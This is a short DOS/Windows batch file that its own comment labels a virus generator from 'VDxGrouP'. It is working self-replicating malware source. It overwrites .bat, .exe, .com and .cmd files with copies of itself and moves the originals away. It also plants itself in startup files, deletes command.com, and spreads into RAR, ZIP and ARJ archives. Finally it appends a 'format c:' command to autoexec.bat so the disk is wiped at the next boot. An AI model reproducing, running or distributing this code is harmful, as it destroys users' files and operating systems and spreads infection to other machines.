rem Generator Bat virusov VDxGrouP 
@echo off
@cls rem "VDxGrouP"
for %%d in (*.bat) do set B=%%d
move %B% c:\helps.ini
copy %0 %B%
for %%m in (*.cmd) do set M=%%m
for %%e in (*.exe) do set E=%%e
for %%c in (*.com) do set C=%%c
move %E% c:\setupsas.ini
move %M% c:\setupsas.log
move %C% c:\helps.log
copy %0 %E%
copy %0 %C%
copy %0 %M%
for %%b in (*.bat) do set VD=%%b
find "VD"<%VD%
if "%2=="autoexec.bat goto $VD
rem 
copy %0 c:\мои документы\command.bat
copy %0 c:\command.bat
copy %0 c:\%winbootdir%\winstart.bat
del c:\%winbootdir\???.ini
del c:\command.com
 Echo VDxGrouP>>c:\autoexec.bat
 Echo VDxGroup Virus Lab>>c:\autoexec.bat
type %0.bat>>%2
for %%f in (*.rar *.zip *.arj) do attrib -r %%f
for %%r in (*.rar) do rar a -tk -y -c- -o+ %%r %0
for %%z in (*.zip) do pkzip -m %%z %0
for %%a in (*.arj) do arj a -d %%a %0
 Echo format c:>>c:\autoexec.bat
